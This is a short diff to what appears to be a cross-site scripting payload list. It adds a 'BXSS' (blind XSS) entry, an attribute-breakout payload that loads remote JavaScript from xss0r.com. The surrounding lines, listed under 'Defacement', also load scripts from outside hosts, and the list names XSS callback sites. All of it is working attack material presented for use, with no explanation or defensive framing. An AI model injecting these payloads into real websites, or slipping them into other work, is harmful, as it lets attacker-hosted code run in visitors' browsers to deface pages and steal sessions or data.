@@ -5,6 +5,10 @@ Defacement:
 <script src="https://xss0r.com/Resources/xss0r1.js"></script>
 <script src="https://jso-tools.z-x.my.id/raw/~/RD9CXXDM006AY"></script>
 
+BXSS:
+====
+'"><script src=https://xss0r.com/c/lostsec></script>
+
 https://xss.js.org/#/
 
 # https://cyberlipon.xss.ht/
